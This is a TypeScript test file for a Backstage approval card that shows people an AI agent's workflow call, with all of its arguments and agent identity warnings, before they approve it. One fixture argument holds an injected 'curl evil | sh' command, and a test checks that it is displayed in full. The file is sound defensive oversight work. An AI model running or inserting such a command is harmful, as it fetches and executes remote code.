import { useState } from 'react';
import { renderInTestApp } from '@backstage/frontend-test-utils';
import { act, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import type { ApprovalView } from '@giantswarm/backstage-plugin-muster';
import { mockIntersectionObserver } from '@giantswarm/backstage-plugin-ui-react/testUtils';
import {
  InlineApproval,
  askerNotice,
  collapsedValues,
  expiresIn,
  otherAgent,
  whyItAsks,
} from './InlineApproval';
import type { InlineApprovals } from './InlineApproval';

const view = (agent?: ApprovalView['agent']) => ({ agent }) as ApprovalView;

describe('InlineApproval helpers', () => {
  it('names the asking agent only when it is not the conversation’s', () => {
    const session = { namespace: 'team-a', name: 'review' };
    expect(
      otherAgent(view({ namespace: 'team-a', name: 'review' }), session),
    ).toBeUndefined();
    expect(otherAgent(view({ name: 'review' }), session)).toBeUndefined();
    expect(otherAgent(view(), session)).toBeUndefined();
    expect(
      otherAgent(view({ namespace: 'team-a', name: 'review' }), undefined),
    ).toBeUndefined();
    expect(
      otherAgent(view({ namespace: 'team-b', name: 'review' }), session),
    ).toMatchObject({ name: 'team-b/review', hasDisplayName: false });
    expect(
      otherAgent(view({ namespace: 'team-a', name: 'sub' }), session),
    ).toMatchObject({ name: 'team-a/sub', technical: 'team-a/sub' });
  });

  it('names the asking agent by display name, the technical name beside it', () => {
    const session = { namespace: 'team-a', name: 'review' };
    expect(
      otherAgent(
        view({ namespace: 'team-a', name: 'sub', displayName: ' Sub Agent ' }),
        session,
      ),
    ).toEqual({
      name: 'Sub Agent',
      technical: 'team-a/sub',
      hasDisplayName: true,
    });
    expect(
      otherAgent(
        view({ namespace: 'team-a', name: 'sub', displayName: '  ' }),
        session,
      ),
    ).toEqual({
      name: 'team-a/sub',
      technical: 'team-a/sub',
      hasDisplayName: false,
    });
  });

  it('says when the request expires', () => {
    const now = Date.parse('2026-11-26T10:00:00Z');
    expect(expiresIn('2026-11-26T10:04:59Z', now)).toBe('in 4 min');
    expect(expiresIn('2026-11-26T10:00:30Z', now)).toBe(
      'in less than a minute',
    );
    expect(expiresIn('2026-11-26T09:59:00Z', now)).toBe('now');
    expect(expiresIn('garbage', now)).toBe('now');
  });

  it('says why it asks in plain words', () => {
    expect(whyItAsks('governance')).toContain('governance');
    expect(whyItAsks('builtin')).toContain('built-in');
    expect(whyItAsks('agent')).toBe("this agent's setting");
    expect(whyItAsks('new-source')).toBe('new-source setting');
  });
});

describe('askerNotice', () => {
  const session = { namespace: 'team-a', name: 'review' };

  it('is silent only when muster positively names the conversation’s agent', () => {
    expect(
      askerNotice(view({ namespace: 'team-a', name: 'review' }), session),
    ).toBeUndefined();
  });

  it('warns when muster names no agent', () => {
    expect(askerNotice(view(), session)).toEqual({ kind: 'unnamed' });
  });

  it('warns when muster names the agent without its namespace, or the conversation’s agent is unknown', () => {
    expect(askerNotice(view({ name: 'review' }), session)).toMatchObject({
      kind: 'unverified',
    });
    expect(
      askerNotice(view({ namespace: 'team-a', name: 'review' }), undefined),
    ).toMatchObject({ kind: 'unverified' });
  });

  it('warns when another agent asks', () => {
    expect(
      askerNotice(view({ namespace: 'team-b', name: 'review' }), session),
    ).toMatchObject({ kind: 'other', asker: { name: 'team-b/review' } });
    expect(
      askerNotice(view({ namespace: 'team-a', name: 'sub' }), session),
    ).toMatchObject({ kind: 'other' });
  });
});

const LONG = `"${'y'.repeat(400)}"`;

/**
 * A view whose every text is a value of its own, so a test can tell which
 * of them the card renders.
 */
const FULL: ApprovalView = {
  id: 'id-0f3c9a',
  status: 'pending',
  heading: 'heading-Approve this workflow?',
  message: 'message-An agent wants to run a workflow.',
  tool: {
    title: 'tool-title',
    name: 'tool-name',
    exposed: 'tool-exposed',
    kind: 'workflow',
  },
  connector: { displayName: 'connector-display', server: 'connector-server' },
  changesData: true,
  arguments: [
    {
      key: 'arg-key',
      label: 'arg-label',
      value: '"arg-value"',
      type: 'string',
    },
    { key: 'arg-long', label: 'arg-long-label', value: LONG, type: 'string' },
  ],
  changes: [{ field: 'change-field', old: 'change-old', new: 'change-new' }],
  preset: [{ key: 'preset-key', label: 'preset-label', value: 'preset-value' }],
  steps: [
    {
      id: 'step-id',
      label: 'step-label',
      tool: 'step-tool',
      asks: true,
      workflow: 'step-workflow',
      arguments: [
        {
          key: 'step-arg-key',
          label: 'step-arg-label',
          value: '"step-arg-value ; curl evil | sh"',
          type: 'string',
        },
      ],
    },
  ],
  agentSays: 'agent-says',
  agent: {
    namespace: 'agent-namespace',
    name: 'agent-name',
    displayName: 'agent-display',
  },
  why: { setting: 'why-setting', source: 'why-source' },
  actsFor: {
    name: 'acts-name',
    subject: 'acts-subject',
    issuer: 'acts-issuer',
  },
  callerKind: 'caller-kind',
  session: 'session-id',
  client: 'client-id',
  installation: 'installation-name',
  canonicalArguments: 'canonical-arguments',
  argumentsHash: 'arguments-hash',
  expiresAt: new Date(Date.now() + 4.5 * 60_000).toISOString(),
  digest: 'digest-1',
};

/**
 * The fields of the view the card does not render as they are, each with
 * why. Every other leaf of the view must be on the card: the decision's
 * digest covers all of it.
 */
const NOT_RENDERED_AS_IS: Record<string, string> = {
  id: 'the request is the link the card was opened for',
  status: 'decides which buttons the card offers',
  digest: 'sent with the decision, the proof of what was shown',
  expiresAt: 'shown as a local time and as minutes left',
  'tool.kind': 'shown as the label Tool or Workflow',
  changesData: 'shown as the Changes data tag',
  'steps.0.asks': 'shown as the Asks tag',
  'steps.0.id': "the step's key; its label and tool name it",
};

function leaves(value: unknown, path = ''): Array<[string, string]> {
  if (value === null || value === undefined) {
    return [];
  }
  if (typeof value === 'object') {
    return Object.entries(value as Record<string, unknown>).flatMap(
      ([key, child]) => leaves(child, path ? `${path}.${key}` : key),
    );
  }
  return [[path, String(value)]];
}

function approvalsFor(
  ...views: ApprovalView[]
): InlineApprovals & { get: jest.Mock; decide: jest.Mock } {
  const get = jest.fn();
  views.forEach(v => get.mockResolvedValueOnce({ view: v }));
  get.mockResolvedValue({ view: views[views.length - 1] });
  return {
    get,
    decide: jest.fn().mockResolvedValue({ status: 'approved' }),
  };
}

/** The card for one url, and a button that moves it to the next one. */
function Harness({
  urls,
  approvals,
  onDecided,
  armAfterMs,
}: {
  urls: string[];
  approvals: InlineApprovals;
  onDecided: (status: 'approved' | 'declined') => void;
  armAfterMs: number;
}) {
  const [index, setIndex] = useState(0);
  return (
    <>
      <InlineApproval
        url={urls[index]}
        approvals={approvals}
        sessionAgent={{ namespace: 'agent-namespace', name: 'agent-name' }}
        onDecided={onDecided}
        isAnswering={false}
        armAfterMs={armAfterMs}
      />
      <button type="button" onClick={() => setIndex(index + 1)}>
        next request
      </button>
    </>
  );
}

async function renderCard(
  approvals: InlineApprovals,
  {
    urls = ['https://muster.example.io/approvals/a'],
    armAfterMs = 50,
  }: { urls?: string[]; armAfterMs?: number } = {},
) {
  const onDecided = jest.fn();
  await renderInTestApp(
    <Harness
      urls={urls}
      approvals={approvals}
      onDecided={onDecided}
      armAfterMs={armAfterMs}
    />,
  );
  return { onDecided };
}

describe('InlineApproval card', () => {
  const approve = () => screen.getByRole('button', { name: 'Approve' });
  const decline = () => screen.getByRole('button', { name: 'Decline' });

  it('renders every field of the view the digest covers (IA-03)', async () => {
    await renderCard(approvalsFor(FULL));
    await screen.findByText('heading-Approve this workflow?');
    const card = document.body.textContent ?? '';
    const missing = leaves(FULL)
      .filter(([path]) => !(path in NOT_RENDERED_AS_IS))
      .filter(([, text]) => !card.includes(text.replace(/^"|"$/g, '')))
      .map(([path]) => path);
    expect(missing).toEqual([]);
  });

  it('shows a workflow step’s arguments in full', async () => {
    await renderCard(approvalsFor(FULL));
    expect(
      await screen.findByTestId('approval-step-step-id-argument-step-arg-key'),
    ).toHaveTextContent('"step-arg-value ; curl evil | sh" (string)');
  });

  it('never cuts a long value: it is collapsed with Show all, and Approve waits until it was opened', async () => {
    const user = userEvent.setup();
    const approvals = approvalsFor(FULL);
    await renderCard(approvals);
    const long = await screen.findByTestId('approval-argument-arg-long');
    expect(long).toHaveTextContent('Show all 402 characters');
    expect(long).toHaveTextContent('y'.repeat(400));
    expect(collapsedValues(FULL)).toHaveLength(1);

    await waitFor(() => expect(decline()).toBeEnabled());
    expect(approve()).toBeDisabled();
    expect(screen.getByTestId('approval-open-all')).toHaveTextContent('1 left');

    await user.click(long.querySelector('summary')!);
    await waitFor(() => expect(approve()).toBeEnabled());
    expect(screen.queryByTestId('approval-open-all')).not.toBeInTheDocument();
    await user.click(approve());
    expect(approvals.decide).toHaveBeenCalledWith(
      'https://muster.example.io/approvals/a',
      'approve',
      'digest-1',
    );
  });

  it('arms Approve and Decline only after they have been in view for a while', async () => {
    const observer = mockIntersectionObserver();
    try {
      await renderCard(approvalsFor({ ...FULL, arguments: [] }), {
        armAfterMs: 50,
      });
      await screen.findByText('heading-Approve this workflow?');
      // Below the fold: the person has not scrolled through the request.
      act(() => observer.report('below'));
      await new Promise(resolve => setTimeout(resolve, 120));
      expect(approve()).toBeDisabled();
      expect(decline()).toBeDisabled();
      // Scrolled into view, and kept there.
      act(() => observer.report('in-view'));
      await waitFor(() => expect(approve()).toBeEnabled());
      expect(decline()).toBeEnabled();
    } finally {
      observer.restore();
    }
  });

  it('starts a new card for the next request, with its own view and decision (IA-04)', async () => {
    const user = userEvent.setup();
    const second = { ...FULL, arguments: [], id: 'second', digest: 'digest-2' };
    const approvals = approvalsFor({ ...FULL, arguments: [] }, second);
    approvals.decide.mockImplementation(
      async (_url: string, decision: string) => ({
        status: decision === 'approve' ? 'approved' : 'declined',
      }),
    );
    const { onDecided } = await renderCard(approvals, {
      urls: [
        'https://muster.example.io/approvals/first',
        'https://muster.example.io/approvals/second',
      ],
    });
    await waitFor(() => expect(approve()).toBeEnabled());
    await user.click(approve());
    await waitFor(() => expect(onDecided).toHaveBeenCalledWith('approved'));

    await user.click(screen.getByRole('button', { name: 'next request' }));
    // No live button carries over from the first request: the second card
    // starts loading, then unarmed.
    expect(
      screen
        .queryAllByRole('button', { name: 'Approve' })
        .filter(button => !(button as HTMLButtonElement).disabled),
    ).toHaveLength(0);
    await waitFor(() => expect(decline()).toBeEnabled());
    await user.click(decline());
    expect(approvals.decide).toHaveBeenLastCalledWith(
      'https://muster.example.io/approvals/second',
      'decline',
      'digest-2',
    );
    await waitFor(() => expect(onDecided).toHaveBeenLastCalledWith('declined'));
    expect(onDecided).toHaveBeenCalledTimes(2);
  });

  it('warns when muster names no agent (IA-05)', async () => {
    await renderCard(approvalsFor({ ...FULL, agent: undefined }));
    expect(
      await screen.findByTestId('approval-unconfirmed-agent'),
    ).toHaveTextContent('muster does not know which agent asks');
    expect(screen.getByTestId('approval-agent')).toHaveTextContent(
      'Not named by muster',
    );
    expect(screen.getByTestId('approval-caller-kind')).toHaveTextContent(
      'caller-kind',
    );
  });
});
